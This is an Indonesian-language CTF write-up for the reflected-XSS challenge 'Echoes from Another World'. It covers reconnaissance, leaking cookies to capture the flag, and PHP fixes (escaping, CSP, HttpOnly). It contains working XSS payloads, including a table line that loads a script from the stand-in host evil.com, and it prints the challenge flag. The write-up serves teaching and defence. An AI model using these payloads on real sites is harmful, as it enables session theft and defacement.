---
title: "Write-up CTF: BakaCTF - Echoes from Another World"
description: "Migrated from database"
year: 2026
category: "CTF"
techStack: "CTF, XSS, SimplePayload"
githubUrl: "-"
demoUrl: "-"
coverUrl: "/uploads/cover_1768920669075_56445b974769e.png"
createdAt: "2026-01-20T14:51:09.123Z"
updatedAt: "2026-01-24T17:46:30.132Z"
---

# Write-up CTF: BakaCTF - Echoes from Another World

# Write-up CTF: BakaCTF - Echoes from Another World

## Informasi Challenge

**Nama:** Echoes from Another World  
**Kategori:** Web Security (Cross-Site Scripting / XSS)  
**Tingkat Kesulitan:** Easy  
**Author:** Admin

**URL Target:**
```
https://labctf.free.nf/web3.php
```

---

## Deskripsi Challenge

Sebuah portal antar dunia menampilkan pesan yang dikirim oleh pengunjung. Sistem tampak sederhana, namun ada sesuatu yang menarik tentang bagaimana data diproses dan ditampilkan. Amati dengan teliti apa yang terjadi ketika pesan dikirim dan bagaimana lingkungan browser berinteraksi dengan halaman ini.

### Analisis Deskripsi

Dari deskripsi tersebut, terdapat beberapa indikasi kuat:
- ✓ "menampilkan pesan yang dikirim"
- ✓ "bagaimana data diproses dan ditampilkan"
- ✓ "lingkungan browser"

➡️ Ini mengarah langsung ke kerentanan **Cross-Site Scripting (XSS)**.

---

## Tahap 1: Recon & Observasi Awal

### Akses Halaman

Target diakses melalui browser:

```
https://labctf.free.nf/web3.php
```

### Halaman menampilkan:
- Sebuah input field untuk pesan
- Tombol submit
- Pesan yang dikirim ditampilkan kembali ke halaman

---

## Tahap 2: Identifikasi Reflected Input

Dilakukan pengujian awal dengan input sederhana:

```
hello
```

**Hasil:**
```
hello
```

➡️ Input user direfleksikan langsung ke HTML output, menandakan potensi **Reflected XSS**.

---

## Tahap 3: Pengujian XSS Dasar

### Payload Uji

```html
<script>alert(1)</script>
```

### Hasil:
- ✅ Browser mengeksekusi JavaScript
- ✅ Muncul popup `alert(1)`

**✅ Reflected XSS terkonfirmasi**

---

## Tahap 4: Eksekusi Payload Nyata (Cookie Leak)

Untuk membuktikan dampak keamanan, digunakan payload berikut:

```html
<script>alert(document.cookie)</script>
```

### Payload ini bertujuan untuk:
- Mengeksekusi JavaScript di browser korban
- Membaca cookie yang tersimpan
- Membuktikan adanya information disclosure

---

## Tahap 5: Pengambilan Flag

Setelah payload dieksekusi, browser menampilkan cookie:

```
__test=922882990d6e520386e1c2ec4de2772c;
FLAG=BakaCTF%7Breflected_xss_cookie_leak%7D
```

### Decode URL Encoding

Cookie `FLAG` masih dalam bentuk URL-encoded:

```
BakaCTF%7Breflected_xss_cookie_leak%7D
↓
BakaCTF{reflected_xss_cookie_leak}
```

---

## 🎯 Flag

```
BakaCTF{reflected_xss_cookie_leak}
```

---

## Vulnerability yang Ditemukan

### 🔴 Reflected Cross-Site Scripting (XSS)

**Detail Kerentanan:**
- **Jenis:** Reflected XSS
- **CWE:** CWE-79
- **OWASP Top 10:** A03 – Injection

**Penyebab:**
- Input user langsung dirender ke HTML
- Tidak ada output encoding (`htmlspecialchars`)
- Tidak ada Content Security Policy (CSP)

---

## Dampak Keamanan

Jika kerentanan ini terjadi di aplikasi nyata, dampaknya bisa meliputi:

- 🍪 **Pencurian cookie dan session**
- 🔐 **Account takeover**
- 🎭 **Phishing berbasis JavaScript**
- 🧨 **Arbitrary JavaScript execution**
- 🖥️ **Manipulasi DOM / defacement**

---

## Rekomendasi Perbaikan (Mitigation)

Untuk mencegah XSS, pengembang harus:

### ✅ Security Best Practices:

1. **Escape output** menggunakan `htmlspecialchars()`
2. **Gunakan context-aware output encoding**
3. **Terapkan Content Security Policy (CSP)**
4. **Jangan render input user mentah ke HTML**
5. **Gunakan framework dengan auto-escaping**

### Contoh Mitigasi (PHP)

```php
<?php
// BAD: Vulnerable to XSS
echo $_GET['message'];

// GOOD: Properly escaped
echo htmlspecialchars($_GET['message'], ENT_QUOTES, 'UTF-8');
?>
```

### Implementasi Lengkap dengan Validasi

```php
<?php
// Input validation and sanitization
$message = $_GET['message'] ?? '';

// Validate input length
if (strlen($message) > 500) {
    die('Message too long');
}

// Output encoding - CRITICAL for XSS prevention
$safe_message = htmlspecialchars($message, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');

// Display safely
echo "<div class='message'>" . $safe_message . "</div>";
?>
```

### Content Security Policy (CSP)

Tambahkan header CSP untuk mencegah inline scripts:

```php
<?php
header("Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none';");
?>
```

### HTTPOnly Cookie Flag

Untuk mencegah cookie theft via JavaScript:

```php
<?php
setcookie(
    'FLAG',
    'BakaCTF{flag_here}',
    [
        'httponly' => true,  // Prevent JavaScript access
        'secure' => true,    // HTTPS only
        'samesite' => 'Strict'
    ]
);
?>
```

---

## Exploit Timeline

```
1. Reconnaissance
   └─> Akses halaman web3.php
   └─> Identifikasi input field dan reflection point

2. Testing
   └─> Input: "hello" → Reflected: "hello"
   └─> Konfirmasi reflection tanpa encoding

3. XSS Proof of Concept
   └─> Payload: <script>alert(1)</script>
   └─> Browser execute JavaScript ✓

4. Exploitation
   └─> Payload: <script>alert(document.cookie)</script>
   └─> Cookie disclosed dalam popup

5. Flag Extraction
   └─> Cookie FLAG ditemukan (URL-encoded)
   └─> Decode: BakaCTF{reflected_xss_cookie_leak}
```

---

## XSS Attack Vectors

### Common XSS Payloads

| Payload Type | Example | Purpose |
|--------------|---------|---------|
| **Basic Alert** | `<script>alert(1)</script>` | Proof of concept |
| **Cookie Theft** | `<script>alert(document.cookie)</script>` | Information disclosure |
| **External Script** | `<script src="//evil.com/xss.js"></script>` | Remote code execution |
| **Image Tag** | `` | Event-based XSS |
| **SVG Vector** | `<svg/onload=alert(1)>` | SVG-based XSS |
| **DOM Manipulation** | `<script>document.body.innerHTML='HACKED'</script>` | Defacement |

### XSS Context Types

```
1. Reflected XSS (Non-Persistent)
   └─> Input reflected immediately in response
   └─> Requires victim to click malicious link

2. Stored XSS (Persistent)
   └─> Payload stored in database
   └─> Executes on every page load

3. DOM-based XSS
   └─> Vulnerability in client-side JavaScript
   └─> Never sent to server
```

---

## Tools untuk Testing XSS

### Manual Testing
```bash
# Basic test
<script>alert(1)</script>

# Event handlers

<body onload=alert(1)>

# SVG
<svg/onload=alert(1)>

# JavaScript pseudo-protocol
<a href="javascript:alert(1)">Click</a>
```

### Automated Tools
- **XSStrike** - Advanced XSS detection suite
- **Dalfox** - Parameter analysis and XSS scanning
- **Burp Suite** - Professional web vulnerability scanner
- **OWASP ZAP** - Free security testing tool

---

## Defense in Depth Strategy

### Layer 1: Input Validation
```php
// Whitelist allowed characters
if (!preg_match('/^[a-zA-Z0-9\s.,!?-]+$/', $input)) {
    die('Invalid input');
}
```

### Layer 2: Output Encoding
```php
// Context-aware encoding
echo htmlspecialchars($data, ENT_QUOTES, 'UTF-8');
```

### Layer 3: Content Security Policy
```
Content-Security-Policy: default-src 'self'; script-src 'self'
```

### Layer 4: HTTPOnly Cookies
```php
setcookie('session', $value, ['httponly' => true, 'secure' => true]);
```

### Layer 5: X-XSS-Protection Header
```php
header('X-XSS-Protection: 1; mode=block');
```

---

## OWASP XSS Prevention Cheat Sheet

### Rule #0: Never Insert Untrusted Data
Except in allowed locations:
- Inside HTML elements
- Inside HTML attributes
- Inside JavaScript data values
- Inside CSS property values

### Rule #1: HTML Escape Before Inserting Untrusted Data

```php
function encodeForHTML($input) {
    return htmlspecialchars($input, ENT_QUOTES | ENT_HTML5, 'UTF-8');
}
```

### Rule #2: Attribute Escape Before Inserting Untrusted Data

```php
echo "<div data-user='" . encodeForHTMLAttribute($user) . "'>";
```

### Rule #3: JavaScript Escape Before Inserting Untrusted Data

```php
echo "<script>var name = '" . encodeForJavaScript($name) . "';</script>";
```

### Rule #4: CSS Escape Before Inserting Untrusted Data

```php
echo "<style>.class { color: " . encodeForCSS($color) . "; }</style>";
```

---

## Resources untuk Belajar Lebih Lanjut

### XSS Documentation
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [PortSwigger XSS Academy](https://portswigger.net/web-security/cross-site-scripting)
- [HackTricks XSS](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting)

### XSS Payloads
- [PayloadsAllTheThings XSS](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)
- [XSS Filter Evasion Cheat Sheet](https://owasp.org/www-community/xss-filter-evasion-cheatsheet)

### Security Standards
- [CWE-79: Cross-site Scripting](https://cwe.mitre.org/data/definitions/79.html)
- [OWASP Top 10 2021 - A03 Injection](https://owasp.org/Top10/A03_2021-Injection/)

### Practice Platforms
- [HackTheBox](https://www.hackthebox.com/)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- [PentesterLab](https://pentesterlab.com/)

---

## Pembelajaran

### Skills yang Dipelajari

1. **XSS Identification** - Recognizing reflection points
2. **Payload Crafting** - Creating effective XSS payloads
3. **Cookie Manipulation** - Understanding browser security model
4. **Output Encoding** - Proper data sanitization
5. **Security Headers** - CSP and XSS protection mechanisms

### OWASP Top 10 Coverage

Challenge ini mencakup:
- ✅ A03: Injection (Cross-Site Scripting)
- ✅ A05: Security Misconfiguration (Missing CSP)
- ✅ A07: Identification and Authentication Failures (Cookie exposure)

---

## Summary Attack Chain

```
User Input → No Validation → Direct HTML Render → XSS Execution → Cookie Leak
     ↓              ↓                  ↓                ↓              ↓
  Payload    No Sanitization   Reflected XSS    JavaScript Runs   Flag Found
```

---

**Selesai! 🎯**

Challenge ini mengajarkan fundamental XSS security:
- Never trust user input
- Always encode output based on context
- Implement Content Security Policy
- Use HTTPOnly flags for sensitive cookies
- Apply defense in depth principles
- Validate and sanitize all data
